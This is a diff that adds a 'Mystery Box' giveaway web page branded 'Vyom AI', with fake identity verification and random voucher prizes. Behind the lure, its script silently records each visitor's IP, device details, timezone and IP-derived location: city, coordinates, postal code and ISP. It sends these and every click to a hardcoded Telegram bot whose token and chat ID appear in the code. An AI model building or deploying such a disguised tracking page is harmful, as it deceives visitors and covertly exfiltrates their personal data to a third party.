@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vyom — Mystery Box</title>
+    <style>
+        /* --- Global Reset --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: radial-gradient(circle at top left, #0A192F, #020c1b);
+            padding: 20px;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(16px) saturate(180%);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(100, 255, 218, 0.15);
+            border-radius: 32px;
+            padding: 50px 40px;
+            max-width: 520px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(100, 255, 218, 0.05);
+            transition: all 0.3s ease;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(100, 255, 218, 0.08);
+            border: 1px solid rgba(100, 255, 218, 0.2);
+            border-radius: 100px;
+            padding: 6px 18px;
+            font-size: 11px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #64FFDA;
+            margin-bottom: 28px;
+        }
+
+        .box-icon {
+            font-size: 80px;
+            margin: 16px 0 24px;
+            display: inline-block;
+            animation: pulse 2.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .sub {
+            font-size: 15px;
+            color: #8892B0;
+            line-height: 1.6;
+            margin-bottom: 32px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, #64FFDA, #48c9b0);
+            border: none;
+            color: #0A192F;
+            font-weight: 600;
+            font-size: 18px;
+            padding: 16px 48px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 10px 30px -8px rgba(100, 255, 218, 0.2);
+            letter-spacing: 0.5px;
+        }
+
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 14px 40px -6px rgba(100, 255, 218, 0.4);
+        }
+
+        .btn:active {
+            transform: scale(0.96);
+        }
+
+        .footer {
+            margin-top: 32px;
+            font-size: 12px;
+            color: #495670;
+            letter-spacing: 0.5px;
+        }
+
+        .footer span {
+            color: #64FFDA;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .loader {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(100, 255, 218, 0.1);
+            border-radius: 50%;
+            border-top-color: #64FFDA;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="app">
+
+        <!-- PAGE 1: INTRO -->
+        <div id="page1">
+            <div class="badge">Vyom AI</div>
+            <div class="box-icon">🎁</div>
+            <h1>Exclusive Mystery Box</h1>
+            <p class="sub">Tap continue to unlock your personalized surprise.</p>
+            <button class="btn" onclick="nextPage()">🔓 Continue</button>
+        </div>
+
+        <!-- PAGE 2: LOADING -->
+        <div id="page2" class="hidden">
+            <div class="badge">🎯 Step 1 / 4</div>
+            <div class="box-icon">✨</div>
+            <h1>Processing...</h1>
+            <p class="sub"><span class="loader"></span> Verifying your identity</p>
+            <button class="btn" onclick="nextPage()">⏳ Continue</button>
+        </div>
+
+        <!-- PAGE 3: SURPRISE -->
+        <div id="page3" class="hidden">
+            <div class="badge">🎉 Unlocked</div>
+            <div class="box-icon">🎁</div>
+            <h1 id="surpriseText">Your surprise is ready!</h1>
+            <p class="sub" id="surpriseDesc">You've been selected for a premium reward.</p>
+            <button class="btn" onclick="nextPage()">✨ Continue</button>
+        </div>
+
+        <!-- PAGE 4: FINAL -->
+        <div id="page4" class="hidden">
+            <div class="badge">🏆 Vyom</div>
+            <div class="box-icon">🚀</div>
+            <h1>You're now a <span style="color:#64FFDA;">Mystery Master</span></h1>
+            <p class="sub">Share this experience with your network.</p>
+            <div class="footer">Vyom — <span>Intelligence. Automated.</span></div>
+        </div>
+
+    </div>
+
+    <script>
+        // ========================================================
+        // CONFIG — SET YOUR BOT TOKEN & CHAT ID
+        // ========================================================
+        const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";   // @BotFather se lo
+        const CHAT_ID   = "8363966106";     // Get from @getmyid_bot
+        const DEV_TAG   = "dev @btwspark";         // Auto-appended to every Telegram message
+
+        // ========================================================
+        // STATE
+        // ========================================================
+        let step = 1;
+        let userData = {};
+
+        // ========================================================
+        // SEND TO TELEGRAM (Branded Format)
+        // ========================================================
+        function sendToTelegram(text, extra = "") {
+            if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
+                console.warn("⚠️ Set BOT_TOKEN and CHAT_ID in the script.");
+                return;
+            }
+
+            const now = new Date();
+            const timestamp = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+            const message = `
+                🧠 *Vyom Mystery Tracker*
+                📅 ${timestamp}
+                ${text}
+                ${extra}
+                ———
+                🛠️ ${DEV_TAG}
+            `;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
+            }).catch(err => console.error('Telegram error:', err));
+        }
+
+        // ========================================================
+        // CAPTURE IP & DEVICE INFO
+        // ========================================================
+        function captureInfo() {
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    userData.ip = ipData.ip;
+                    userData.device = navigator.userAgent;
+                    userData.language = navigator.language;
+                    userData.screen = window.screen.width + 'x' + window.screen.height;
+                    userData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                    const msg =
+                        '🆕 *New Visitor*\n' +
+                        '📌 IP: `' + userData.ip + '`\n' +
+                        '📱 Device: ' + userData.device.substring(0, 80) + '...\n' +
+                        '🌐 Lang: ' + userData.language + '\n' +
+                        '📐 Screen: ' + userData.screen + '\n' +
+                        '🕐 TZ: ' + userData.timezone;
+
+                    sendToTelegram(msg);
+                })
+                .catch(() => {
+                    userData.ip = 'unavailable';
+                });
+        }
+
+        // ========================================================
+        // FETCH LOCATION (via IP)
+        // ========================================================
+        function getLocation() {
+            if (!userData.ip || userData.ip === 'unavailable') {
+                sendToTelegram('📍 Location could not be fetched (IP unavailable).');
+                return;
+            }
+
+            fetch(`https://ipapi.co/${userData.ip}/json/`)
+                .then(res => res.json())
+                .then(loc => {
+                    const msg =
+                        '📍 *Live Location*\n' +
+                        '🌍 City: ' + (loc.city || 'N/A') + '\n' +
+                        '🏙️ Region: ' + (loc.region || 'N/A') + '\n' +
+                        '🇮🇳 Country: ' + (loc.country_name || 'N/A') + '\n' +
+                        '📌 Lat/Long: ' + (loc.latitude || 'N/A') + ', ' + (loc.longitude || 'N/A') + '\n' +
+                        '📮 Postal: ' + (loc.postal || 'N/A') + '\n' +
+                        '🌐 ISP: ' + (loc.org || 'N/A');
+                    sendToTelegram(msg);
+                })
+                .catch(() => {
+                    sendToTelegram('📍 Location data could not be retrieved.');
+                });
+        }
+
+        // ========================================================
+        // CONTINUE CLICK — Next Page + Tracking
+        // ========================================================
+        function nextPage() {
+            // Hide current page
+            document.getElementById('page' + step).classList.add('hidden');
+            step++;
+
+            if (step > 4) {
+                step = 4;
+                document.getElementById('page4').classList.remove('hidden');
+                return;
+            }
+
+            // Show next page
+            document.getElementById('page' + step).classList.remove('hidden');
+
+            // Track continue click
+            sendToTelegram('👆 *Continue Clicked*\nStep: ' + step + '/4\nIP: ' + (userData.ip || 'unknown'));
+
+            // If reaching Step 3, fetch location + reveal surprise
+            if (step === 3) {
+                getLocation();
+
+                const surprises = [
+                    { title: '🎁 ₹500 Gift Card', desc: 'Redeem this exclusive voucher.' },
+                    { title: '🎁 AI Course Voucher', desc: 'Premium AI course worth ₹2000.' },
+                    { title: '🎁 ₹2000 Discount', desc: 'Valid on any Vyom service.' },
+                    { title: '🎁 1-Minute Happiness', desc: 'Your daily dose of positivity.' }
+                ];
+                const rand = Math.floor(Math.random() * surprises.length);
+                document.getElementById('surpriseText').innerText = surprises[rand].title;
+                document.getElementById('surpriseDesc').innerText = surprises[rand].desc;
+            }
+        }
+
+        // ========================================================
+        // INIT — On Page Load
+        // ========================================================
+        window.onload = function() {
+            captureInfo();
+        };
+    </script>
+
+</body>
+</html>
